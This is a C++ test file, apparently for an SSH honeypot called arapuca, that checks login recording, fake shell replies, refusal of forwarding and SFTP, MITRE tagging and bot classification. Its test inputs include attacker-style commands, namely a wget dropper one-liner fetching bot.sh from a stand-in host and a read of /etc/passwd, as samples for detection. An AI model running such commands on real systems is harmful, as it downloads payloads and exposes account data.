// End to end tests against a real SSH server.
//
// The service is started on an ephemeral port and driven with a real libssh
// client, so what is exercised is the protocol path an attacker takes, not a
// mock of it. These are the tests that would catch a channel policy that is
// correct in the unit tests and wrong on the wire.

#include <arapuca/core/config.hpp>
#include <arapuca/core/event_bus.hpp>
#include <arapuca/enrich/geoip.hpp>
#include <arapuca/enrich/mitre_mapper.hpp>
#include <arapuca/ssh/auth_policy.hpp>
#include <arapuca/ssh/shell.hpp>
#include <arapuca/ssh/ssh_service.hpp>
#include <arapuca/ssh/vfs.hpp>

#include <libssh/libssh.h>

#include <gtest/gtest.h>

#include <chrono>
#include <filesystem>
#include <string>
#include <thread>
#include <vector>

namespace {

using arapuca::core::Event;
using arapuca::core::EventBus;
using arapuca::core::EventType;
using namespace std::chrono_literals;

/// Owns a running honeypot and everything it borrows.
class Honeypot {
public:
    Honeypot() {
        key_dir_ =
            std::filesystem::temp_directory_path() /
            ("arapuca-itest-" + std::to_string(::getpid()) + "-" + std::to_string(next_instance()));
        std::filesystem::create_directories(key_dir_);

        config_.sensor_name = "arapuca-itest";
        config_.ssh.port = 0;  // ephemeral, so parallel runs do not collide
        config_.ssh.host_key = key_dir_ / "host_ed25519";
        config_.ssh.session_timeout = 5s;
        config_.ssh.max_sessions = 16;
        config_.ssh.max_sessions_per_ip = 8;

        auth_ = arapuca::ssh::AuthPolicy::from_yaml(R"(
credentials:
  - { username: "root", password: "123456" }
)");
        filesystem_ =
            arapuca::ssh::Vfs::from_file(std::string(ARAPUCA_CONFIG_DIR) + "/filesystem.yaml");
        mitre_ = arapuca::enrich::MitreMapper::from_file(std::string(ARAPUCA_CONFIG_DIR) +
                                                         "/mitre.yaml");

        arapuca::ssh::SshDependencies deps;
        deps.config = &config_;
        deps.bus = &bus_;
        deps.registry = &registry_;
        deps.auth = &auth_;
        deps.filesystem = &filesystem_;
        deps.mitre = &mitre_;
        deps.geo = &geo_;
        deps.on_capture = [this](arapuca::ssh::CaptureRequest request) {
            const std::lock_guard<std::mutex> lock(capture_mutex_);
            captured_.push_back(std::move(request));
        };

        service_ = std::make_unique<arapuca::ssh::SshService>(std::move(deps));
        service_->start();
    }

    Honeypot(const Honeypot&) = delete;
    Honeypot& operator=(const Honeypot&) = delete;
    Honeypot(Honeypot&&) = delete;
    Honeypot& operator=(Honeypot&&) = delete;

    ~Honeypot() {
        service_->stop();
        std::error_code ec;
        std::filesystem::remove_all(key_dir_, ec);
    }

    [[nodiscard]] std::uint16_t port() const {
        return service_->port();
    }

    /// Drain everything published so far, waiting briefly for stragglers.
    std::vector<Event> events() {
        std::vector<Event> out;
        for (int i = 0; i < 40; ++i) {
            bus_.consume(out, 256, 25ms);
            if (!out.empty() && has(out, EventType::SshSessionEnd)) {
                break;
            }
        }
        return out;
    }

    static bool has(const std::vector<Event>& events, EventType type) {
        return std::any_of(events.begin(), events.end(), [type](const Event& event) {
            return event.type == type;
        });
    }

    static std::vector<Event> of_type(const std::vector<Event>& events, EventType type) {
        std::vector<Event> out;
        std::copy_if(
            events.begin(), events.end(), std::back_inserter(out), [type](const Event& event) {
                return event.type == type;
            });
        return out;
    }

    std::vector<arapuca::ssh::CaptureRequest> captured() {
        const std::lock_guard<std::mutex> lock(capture_mutex_);
        return captured_;
    }

private:
    static int next_instance() {
        static int counter = 0;
        return ++counter;
    }

    std::filesystem::path key_dir_;
    arapuca::core::Config config_;
    EventBus bus_{4096};
    arapuca::ssh::CommandRegistry registry_ = arapuca::ssh::CommandRegistry::standard();
    arapuca::ssh::AuthPolicy auth_;
    arapuca::ssh::Vfs filesystem_;
    arapuca::enrich::MitreMapper mitre_;
    arapuca::enrich::GeoIp geo_;
    std::unique_ptr<arapuca::ssh::SshService> service_;

    std::mutex capture_mutex_;
    std::vector<arapuca::ssh::CaptureRequest> captured_;
};

/// Minimal libssh client, in the shape an attacker's tooling would use it.
class Client {
public:
    explicit Client(std::uint16_t port) : session_(ssh_new()) {
        const std::string host = "127.0.0.1";
        const int number = port;
        const int verbosity = SSH_LOG_NOLOG;
        const long timeout = 5;
        ssh_options_set(session_, SSH_OPTIONS_HOST, host.c_str());
        ssh_options_set(session_, SSH_OPTIONS_PORT, &number);
        ssh_options_set(session_, SSH_OPTIONS_LOG_VERBOSITY, &verbosity);
        ssh_options_set(session_, SSH_OPTIONS_TIMEOUT, &timeout);
        ssh_options_set(session_, SSH_OPTIONS_STRICTHOSTKEYCHECK, "no");
    }

    Client(const Client&) = delete;
    Client& operator=(const Client&) = delete;
    Client(Client&&) = delete;
    Client& operator=(Client&&) = delete;

    ~Client() {
        if (channel_ != nullptr) {
            ssh_channel_close(channel_);
            ssh_channel_free(channel_);
        }
        ssh_disconnect(session_);
        ssh_free(session_);
    }

    bool connect() {
        return ssh_connect(session_) == SSH_OK;
    }

    int authenticate(const std::string& user, const std::string& password) {
        ssh_options_set(session_, SSH_OPTIONS_USER, user.c_str());
        return ssh_userauth_password(session_, nullptr, password.c_str());
    }

    bool open_session_channel() {
        channel_ = ssh_channel_new(session_);
        return channel_ != nullptr && ssh_channel_open_session(channel_) == SSH_OK;
    }

    /// Try to open a direct-tcpip channel, which the honeypot must refuse.
    bool open_forward(const std::string& host, int port) {
        ssh_channel channel = ssh_channel_new(session_);
        if (channel == nullptr) {
            return false;
        }
        const bool opened =
            ssh_channel_open_forward(channel, host.c_str(), port, "127.0.0.1", 1234) == SSH_OK;
        ssh_channel_free(channel);
        return opened;
    }

    bool request_subsystem(const std::string& name) {
        if (channel_ == nullptr) {
            return false;
        }
        return ssh_channel_request_subsystem(channel_, name.c_str()) == SSH_OK;
    }

    bool request_shell() {
        return channel_ != nullptr && ssh_channel_request_pty(channel_) == SSH_OK &&
               ssh_channel_request_shell(channel_) == SSH_OK;
    }

    bool request_exec(const std::string& command) {
        return channel_ != nullptr && ssh_channel_request_exec(channel_, command.c_str()) == SSH_OK;
    }

    void write(const std::string& text) {
        if (channel_ != nullptr) {
            ssh_channel_write(channel_, text.data(), static_cast<std::uint32_t>(text.size()));
        }
    }

    /// Read until the deadline, returning everything that arrived.
    std::string read_for(std::chrono::milliseconds budget) {
        std::string out;
        const auto deadline = std::chrono::steady_clock::now() + budget;
        std::array<char, 4096> buffer{};
        while (std::chrono::steady_clock::now() < deadline && channel_ != nullptr) {
            const int read = ssh_channel_read_timeout(
                channel_, buffer.data(), static_cast<std::uint32_t>(buffer.size()), 0, 100);
            if (read > 0) {
                out.append(buffer.data(), static_cast<std::size_t>(read));
            } else if (read < 0) {
                break;
            }
        }
        return out;
    }

private:
    ssh_session session_;
    ssh_channel channel_ = nullptr;
};

// --- tests ----------------------------------------------------------------

TEST(SshServer, StartsAndBindsAnEphemeralPort) {
    const Honeypot honeypot;
    EXPECT_GT(honeypot.port(), 0);
}

TEST(SshServer, GeneratesAHostKeyOnFirstRun) {
    const auto path = std::filesystem::temp_directory_path() / "arapuca-key-test/host_key";
    std::filesystem::remove_all(path.parent_path());

    EXPECT_NO_THROW({ arapuca::ssh::SshService::ensure_host_key(path); });
    ASSERT_TRUE(std::filesystem::exists(path));

    // A stable fingerprint across restarts matters: a changed host key makes
    // an attacker's client print a warning and the attacker leave.
    const auto first = std::filesystem::last_write_time(path);
    arapuca::ssh::SshService::ensure_host_key(path);
    EXPECT_EQ(first, std::filesystem::last_write_time(path));

    std::filesystem::remove_all(path.parent_path());
}

TEST(SshServer, RefusedLoginIsRecorded) {
    Honeypot honeypot;
    {
        Client client(honeypot.port());
        ASSERT_TRUE(client.connect());
        EXPECT_NE(SSH_AUTH_SUCCESS, client.authenticate("root", "wrong-password"));
    }

    const auto events = honeypot.events();
    const auto attempts = Honeypot::of_type(events, EventType::SshAuthAttempt);
    ASSERT_FALSE(attempts.empty());

    const auto& attempt = attempts.front();
    EXPECT_EQ("root", attempt.detail.at("username").get<std::string>());
    EXPECT_EQ("wrong-password", attempt.detail.at("password").get<std::string>());
    EXPECT_FALSE(attempt.detail.at("accepted").get<bool>());
    // A brute force attempt is tagged whether it succeeded or not.
    ASSERT_TRUE(attempt.mitre.has_value());
    EXPECT_EQ("T1110", attempt.mitre.value_or(arapuca::core::Mitre{}).technique_id);
}

TEST(SshServer, AcceptedLoginReachesAShell) {
    Honeypot honeypot;
    std::string banner;
    {
        Client client(honeypot.port());
        ASSERT_TRUE(client.connect());
        ASSERT_EQ(SSH_AUTH_SUCCESS, client.authenticate("root", "123456"));
        ASSERT_TRUE(client.open_session_channel());
        ASSERT_TRUE(client.request_shell());
        banner = client.read_for(500ms);
    }

    EXPECT_NE(std::string::npos, banner.find("Ubuntu"));
    EXPECT_NE(std::string::npos, banner.find("root@"));

    const auto events = honeypot.events();
    EXPECT_TRUE(Honeypot::has(events, EventType::SshSessionStart));
    EXPECT_TRUE(Honeypot::has(events, EventType::SshSessionEnd));
}

TEST(SshServer, CommandsAreAnsweredAndRecorded) {
    Honeypot honeypot;
    std::string output;
    {
        Client client(honeypot.port());
        ASSERT_TRUE(client.connect());
        ASSERT_EQ(SSH_AUTH_SUCCESS, client.authenticate("root", "123456"));
        ASSERT_TRUE(client.open_session_channel());
        ASSERT_TRUE(client.request_shell());
        (void)client.read_for(300ms);

        client.write("whoami\r");
        output += client.read_for(400ms);
        client.write("cat /etc/passwd\r");
        output += client.read_for(400ms);
        client.write("exit\r");
        (void)client.read_for(300ms);
    }

    EXPECT_NE(std::string::npos, output.find("root"));
    EXPECT_NE(std::string::npos, output.find("root:x:0:0"));

    const auto commands = Honeypot::of_type(honeypot.events(), EventType::SshCommand);
    ASSERT_GE(commands.size(), 2U);
    EXPECT_EQ("whoami", commands[0].detail.at("command").get<std::string>());
    EXPECT_EQ(1, commands[0].detail.at("seq").get<int>());
    EXPECT_EQ("cat /etc/passwd", commands[1].detail.at("command").get<std::string>());
    ASSERT_TRUE(commands[1].mitre.has_value());
    EXPECT_EQ("T1003.008", commands[1].mitre.value_or(arapuca::core::Mitre{}).technique_id);
}

// Safety invariant S10, on the wire rather than in a unit test.
TEST(SshServer, PortForwardingIsRefusedAndRecorded) {
    Honeypot honeypot;
    {
        Client client(honeypot.port());
        ASSERT_TRUE(client.connect());
        ASSERT_EQ(SSH_AUTH_SUCCESS, client.authenticate("root", "123456"));
        EXPECT_FALSE(client.open_forward("198.51.100.1", 25))
            << "the honeypot must never be usable as a proxy";
    }

    const auto denied = Honeypot::of_type(honeypot.events(), EventType::SshChannelDenied);
    ASSERT_FALSE(denied.empty());
    EXPECT_EQ("direct-tcpip", denied.front().detail.at("request_type").get<std::string>());
    EXPECT_EQ("198.51.100.1", denied.front().detail.at("target_host").get<std::string>());
    EXPECT_EQ(25, denied.front().detail.at("target_port").get<int>());
}

TEST(SshServer, SubsystemsAreRefusedAndRecorded) {
    Honeypot honeypot;
    {
        Client client(honeypot.port());
        ASSERT_TRUE(client.connect());
        ASSERT_EQ(SSH_AUTH_SUCCESS, client.authenticate("root", "123456"));
        ASSERT_TRUE(client.open_session_channel());
        EXPECT_FALSE(client.request_subsystem("sftp")) << "SFTP would be a real file transfer path";
    }

    const auto denied = Honeypot::of_type(honeypot.events(), EventType::SshChannelDenied);
    ASSERT_FALSE(denied.empty());
    EXPECT_EQ("subsystem", denied.front().detail.at("request_type").get<std::string>());
}

// The single most valuable thing a honeypot captures.
TEST(SshServer, DropperOneLinerHandsTheUrlToTheCaptureEngine) {
    Honeypot honeypot;
    {
        Client client(honeypot.port());
        ASSERT_TRUE(client.connect());
        ASSERT_EQ(SSH_AUTH_SUCCESS, client.authenticate("root", "123456"));
        ASSERT_TRUE(client.open_session_channel());
        ASSERT_TRUE(client.request_shell());
        (void)client.read_for(300ms);

        client.write("cd /tmp; wget http://198.51.100.9/bot.sh; chmod +x bot.sh\r");
        (void)client.read_for(500ms);
        client.write("exit\r");
        (void)client.read_for(200ms);
    }

    const auto captured = honeypot.captured();
    ASSERT_EQ(1U, captured.size());
    EXPECT_EQ("http://198.51.100.9/bot.sh", captured.front().url);
    EXPECT_FALSE(captured.front().session_id.empty());

    const auto commands = Honeypot::of_type(honeypot.events(), EventType::SshCommand);
    ASSERT_FALSE(commands.empty());
    ASSERT_TRUE(commands.front().mitre.has_value());
    EXPECT_EQ("T1105", commands.front().mitre.value_or(arapuca::core::Mitre{}).technique_id);
}

TEST(SshServer, ExecRequestIsAnsweredAndRecorded) {
    Honeypot honeypot;
    std::string output;
    {
        Client client(honeypot.port());
        ASSERT_TRUE(client.connect());
        ASSERT_EQ(SSH_AUTH_SUCCESS, client.authenticate("root", "123456"));
        ASSERT_TRUE(client.open_session_channel());
        ASSERT_TRUE(client.request_exec("uname -a"));
        output = client.read_for(500ms);
    }

    EXPECT_NE(std::string::npos, output.find("GNU/Linux"));
    const auto commands = Honeypot::of_type(honeypot.events(), EventType::SshCommand);
    ASSERT_FALSE(commands.empty());
    EXPECT_EQ("uname -a", commands.front().detail.at("command").get<std::string>());
}

TEST(SshServer, SessionEndCarriesAClassification) {
    Honeypot honeypot;
    {
        Client client(honeypot.port());
        ASSERT_TRUE(client.connect());
        ASSERT_EQ(SSH_AUTH_SUCCESS, client.authenticate("root", "123456"));
        ASSERT_TRUE(client.open_session_channel());
        ASSERT_TRUE(client.request_shell());
        (void)client.read_for(200ms);

        // Pasted at machine speed, which is what a script looks like.
        client.write("whoami\rid\runame -a\rpwd\r");
        (void)client.read_for(500ms);
        client.write("exit\r");
        (void)client.read_for(200ms);
    }

    const auto ends = Honeypot::of_type(honeypot.events(), EventType::SshSessionEnd);
    ASSERT_FALSE(ends.empty());
    const auto& end = ends.front();
    EXPECT_GE(end.detail.at("command_count").get<int>(), 4);
    EXPECT_EQ("bot", end.detail.at("classification").get<std::string>());
    EXPECT_LT(end.detail.at("classification_score").get<double>(), 0.0);
}

TEST(SshServer, SeveralSessionsAtOnce) {
    Honeypot honeypot;
    std::vector<std::thread> clients;
    std::atomic<int> succeeded{0};

    clients.reserve(4);
    for (int i = 0; i < 4; ++i) {
        clients.emplace_back([&honeypot, &succeeded] {
            Client client(honeypot.port());
            if (!client.connect()) {
                return;
            }
            if (client.authenticate("root", "123456") != SSH_AUTH_SUCCESS) {
                return;
            }
            if (!client.open_session_channel() || !client.request_shell()) {
                return;
            }
            (void)client.read_for(200ms);
            client.write("whoami\r");
            if (client.read_for(300ms).find("root") != std::string::npos) {
                ++succeeded;
            }
        });
    }
    for (auto& thread : clients) {
        thread.join();
    }
    EXPECT_EQ(4, succeeded.load());
}

}  // namespace
